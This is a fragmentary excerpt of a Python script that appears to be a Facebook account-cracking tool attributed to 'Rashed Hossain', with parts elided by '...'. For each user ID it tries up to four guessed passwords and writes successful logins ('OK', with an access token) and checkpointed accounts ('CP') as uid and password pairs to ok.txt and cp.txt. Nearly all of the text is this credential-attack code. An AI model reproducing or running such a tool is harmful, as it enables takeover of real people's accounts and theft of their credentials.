...
\033[1;36m FACEBOOK USER: Rashed.Error.403
	...
	def main(arg):
		...
		try:
		    ...
		    if 'www.facebook.com' in d['error_msg']:
		        print("\x1b[1;32m[RASHED-HOSSAIN-CP] \033[1;32m"+uid+" | "+pass1)
		        cp=open("cp.txt","a")
		        cp.write(uid+" | "+pass1+"\n")
		        cp.close()
		        cps.append(uid)
		    	...
		    	if "access_token" in d:
		            print("\x1b[1;32m[RASHED-HOSSAIN-OK] \033[1;32m"+uid+" | "+pass1+"\x1b[1;37m")
		            ok=open("ok.txt","a")
		            ok.write(uid+" | "+pass1+"\n")
		            ok.close()
		            oks.append(uid)
		            ...
		            d=json.loads(q)
		            if 'www.facebook.com' in d['error_msg']:
		                print("\x1b[1;32m[RASHED-HOSSAIN-CP] \033[1;32m"+uid+" | "+pass2)
		                cp=open("cp.txt","a")
		                cp.write(uid+" | "+pass2+"\n")
		                cp.close()
		                cps.append(uid)
		                ...
		                if 'access_token' in d:
		                    print("\x1b[1;32m[RASHED-HOSSAIN-OK] \033[1;32m"+uid+" | "+pass2+"\x1b[1;37m")
		                    ok=open("ok.txt","a")
		                    ok.write(uid+" | "+pass2+"\n")
		                    ok.close()
		                    oks.append(uid)
		                    ...
		                    d=json.loads(q)
		                    if 'www.facebook.com' in d['error_msg']:
		                        print("\x1b[1;31m[RASHED-HOSSAIN-CP] "+uid+" | "+pass3)
		                        cp=open("cp.txt","a")
		                        cp.write(uid+" | "+pass3+"\n")
		                        cp.close()
		                        cps.append(uid)
		                        ...
		                        if 'access_token' in d:
		                            print(" \x1b[1;32m[RASHED-HOSSAIN-OK] \033[1;32m"+uid+" | "+pass3+"\x1b[1;37m")
		                            ok=open("ok.txt","a")
		                            ok.write(uid+" | "+pass3+"\n")
		                            ok.close()
		                            oks.append(uid)
		                            ...
		                            d=json.loads(q)
		                            if 'www.facebook.com' in d['error_msg']:
		                                print("\x1b[1;31m[RASHED-HOSSAIN-CP] "+uid+" | "+pass4)
		                                cp=open("cp.txt","a")
		                                cp.write(uid+" | "+pass4+"\n")
		                                cp.close()
		                                cps.append(uid)
		                                ...
		                                if 'access_token' in d:
		                                    print("\x1b[1;32m[RASHED-HOSSAIN-OK] \033[1;32m"+uid+" | "+pass4+"\x1b[1;37m")
		                                    ok=open("ok.txt","a")
		                                    ok.write(uid+" | "+pass4+"\n")
		                                    ok.close()
		                                    oks.append(uid)
